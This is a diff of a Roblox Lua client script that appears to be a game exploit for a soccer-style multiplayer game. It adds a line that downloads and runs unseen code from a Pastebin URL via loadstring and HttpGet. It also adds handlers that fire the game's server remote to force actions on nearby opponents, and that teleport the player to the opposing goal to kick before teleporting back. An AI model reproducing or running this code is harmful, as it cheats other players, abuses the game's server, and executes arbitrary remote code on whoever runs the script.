@@ -3,20 +3,10 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
-
-local spiritbombfx = "https://pastebin.com/raw/aZ3kAGQd"
 local plr = Players.LocalPlayer
-local hotbar = plr.PlayerGui.Hotbar
 
-local names = { "Kamehameha!", "Dragon Combo", "Instant Transmission", "Ultra Instinct.", "Spirit Bomb" }
-for i, name in ipairs(names) do
-	hotbar.Backpack.Hotbar["skill" .. i].Base.ToolName.Text = name
-end
-
-local theme = ReplicatedStorage.Resources.kaiser:FindFirstChild("kaiser theme")
-if theme and theme:IsA("Sound") then
-	theme.SoundId = "rbxassetid://113715007665627"
-end
+loadstring(game:HttpGet("https://pastebin.com/raw/GGzZnvcD",true))()
+local spiritbombfx = "https://pastebin.com/raw/aZ3kAGQd"
 
 local function ult()
 	local char = plr.Character
@@ -49,7 +39,7 @@ UserInputService.InputBegan:Connect(function(input, gp)
 		leapTrack:Play()
 
 		local forward = (root.CFrame - root.Position).LookVector
-		root.Velocity = forward * 225 + Vector3.new(0, 120, 0)
+		root.Velocity = forward * 165 + Vector3.new(0, 95, 0)
 
 		task.wait(0.45)
 		leapTrack:Stop()
@@ -134,6 +124,54 @@ UserInputService.InputBegan:Connect(function(input, gp)
 		end)
 	end
 
+		if input.KeyCode == Enum.KeyCode.Four then
+		local char = plr.Character
+		local root = char and char:FindFirstChild("HumanoidRootPart")
+		if not char or not root then return end
+
+		local stun = char:FindFirstChild("state") and char.state:FindFirstChild("stun")
+		if stun and not stun.Value then
+			stun.Value = true
+			task.wait(0.03)
+			stun.Value = false
+		end
+
+		local ff = Instance.new("ForceField")
+		ff.Visible = true
+		ff.Parent = char
+		game.Debris:AddItem(ff, 10)
+
+		local active = true
+		task.delay(10, function() active = false end)
+
+		local animId = "rbxassetid://109744655458082"
+		local buffer = buffer or { fromstring = function(str) return str end }
+
+		game:GetService("RunService").Stepped:Connect(function()
+			if not active then return end
+			local root = char:FindFirstChild("HumanoidRootPart")
+			if not root then return end
+
+			for _, target in ipairs(Players:GetPlayers()) do
+				if target ~= plr and target.Character and target.Team ~= plr.Team then
+					local hrp = target.Character:FindFirstChild("HumanoidRootPart")
+					local anims = target.Character:FindFirstChildOfClass("Humanoid") and target.Character:FindFirstChildOfClass("Humanoid"):FindFirstChildOfClass("Animator")
+					if hrp and anims and (root.Position - hrp.Position).Magnitude <= 35 then
+						for _, track in ipairs(anims:GetPlayingAnimationTracks()) do
+							if track.Animation.AnimationId == animId then
+								ReplicatedStorage.ByteNetReliable:FireServer(
+									buffer.fromstring("\022\001"),
+									{ { "dribble", false } }
+								)
+								break
+							end
+						end
+					end
+				end
+			end
+		end)
+	end
+
 	if input.KeyCode == Enum.KeyCode.Five then
 		local char = plr.Character
 		local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -151,19 +189,21 @@ UserInputService.InputBegan:Connect(function(input, gp)
 
 		task.delay(5.5, function()
 			local original = root.CFrame
-			local goal = plr.Team.Name == "A" and CFrame.new(-511, 3, 817) or CFrame.new(-557, 3, 1730)
-			root.Anchored = false
-			root.CFrame = goal
+			local goal = plr.Team.Name == "A" and workspace.map:FindFirstChild("Bgoal") or workspace.map:FindFirstChild("Agoal")
+			if goal and goal:IsA("BasePart") then
+				root.Anchored = false
+				root.CFrame = goal.CFrame
 
-			task.wait(0.2)
-			ReplicatedStorage.ByteNetReliable:FireServer(
-				buffer.fromstring("\022\001"),
-				{ { "kick", 50, false, vector.create(0, 1, 0) } }
-			)
+				task.wait(0.2)
+				ReplicatedStorage.ByteNetReliable:FireServer(
+					buffer.fromstring("\022\001"),
+					{ { "kick", 30, true, vector.create(0, 1, 0) } }
+				)
 
-			task.delay(0.2, function()
-				root.CFrame = original
-			end)
+				task.delay(0.2, function()
+					root.CFrame = original
+				end)
+			end
 		end)
 	end
 
